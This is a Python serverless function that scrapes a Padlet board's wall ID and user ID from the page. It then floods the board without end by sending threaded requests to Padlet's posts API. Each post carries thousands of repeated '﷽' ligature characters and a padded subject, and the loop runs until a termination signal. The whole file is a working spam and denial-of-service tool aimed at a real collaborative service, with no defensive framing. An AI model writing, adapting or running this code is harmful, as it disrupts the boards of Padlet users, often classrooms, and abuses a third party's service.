from http.server import BaseHTTPRequestHandler
from concurrent.futures import ThreadPoolExecutor
import requests
import re
import json
from bs4 import BeautifulSoup
import time
import signal

def extract_values(url):
    try:
        # check if the link starts with 'https://'
        if not url.startswith('https://'):
            url = 'https://' + url
            print("Added https:// to your link.")

        # valid padlet link
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script', string=re.compile('window\\.\\$pepinTraits'))

        for script in scripts:
            json_data = re.search(r'window.\\$pepinTraits\\s\*=\\s\*({.\*})', script.string)
            if json_data:
                data = json.loads(json_data.group(1))
                wall_id = data.get('wallId')
                user_id = data.get('userId')
                return wall_id, user_id

        return None, None

    except Exception as e:
        print(f"An error occurred: {str(e)}")
        return None, None

def make_request(session, num_repetitions, repeated_subject, wallidreq, authoridreq):
    body_content = "﷽" * num_repetitions
    url = "https://padlet.com/api/5/wishes"
    headers = {
        "Authorization": "Bearer",
    }
    data = {
        "cid": "c_new6",
        "wall_id": wallidreq,
        "published": True,
        "author_id": authoridreq,
        "width": 200,
        "attachment": "",
        "attachment_caption": None,
        "body": f"<div>{body_content}</div>",
        "subject": repeated_subject,
    }

    response = session.post(url, json=data, headers=headers)
    return response.status_code, response.json()

def main(event, context):
    body = event.get("body", "")
    if body:
        try:
            data = json.loads(body)
            num_repetitions = data.get("num_repetitions", 9000)
            subject = data.get("subject", "test")
            subject_repetitions = data.get("subject_repetitions", 1000)
            repeated_subject = " ".join([subject] * subject_repetitions)
            request_TP = data.get("request_TP", 10)
            wallidreq = data.get("wallidreq", 0)
            authoridreq = data.get("authoridreq", 0)

            # default or manual values
            if wallidreq == 0:
                wallidreq = 0  # manual wall ID

            if authoridreq == 0:
                authoridreq = 0  # manual author ID

            # scrape
            if wallidreq == 1 or authoridreq == 1:
                url = data.get("url", "")
                scraped_wall_id, scraped_author_id = extract_values(url)
                if wallidreq == 1:
                    wallidreq = scraped_wall_id
                if authoridreq == 1:
                    authoridreq = scraped_author_id

            if len(repeated_subject) > 400:
                repeated_subject = repeated_subject[:400]
                print("The subject length exceeded 400 characters and was truncated.")

            NUMBER_OF_REQUESTS = request_TP
            session = requests.Session()

            with ThreadPoolExecutor(max_workers=NUMBER_OF_REQUESTS) as executor:
                successful_attempts = 0
                should_stop = False  # Flag to control the loop

                def handle_signal(signum, frame):
                    nonlocal should_stop
                    should_stop = True

                signal.signal(signal.SIGTERM, handle_signal)

                while not should_stop:
                    futures = [
                        executor.submit(make_request, session, num_repetitions, repeated_subject, wallidreq, authoridreq)
                        for _ in range(NUMBER_OF_REQUESTS)
                    ]

                    for future in futures:
                        status_code, json_response = future.result()
                        if status_code == 201:
                            successful_attempts += 1
                        else:
                            print(status_code, json_response)

                    print(f"Total successful attempts: {successful_attempts}")

            return {"statusCode": 200, "body": f"Success! Total successful attempts: {successful_attempts}"}
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            return {"statusCode": 500, "body": f"Error: {str(e)}"}
    else:
        return {"statusCode": 400, "body": "Bad Request"}

# Vercel runtime
def handler(event, context):
    return main(event, context)
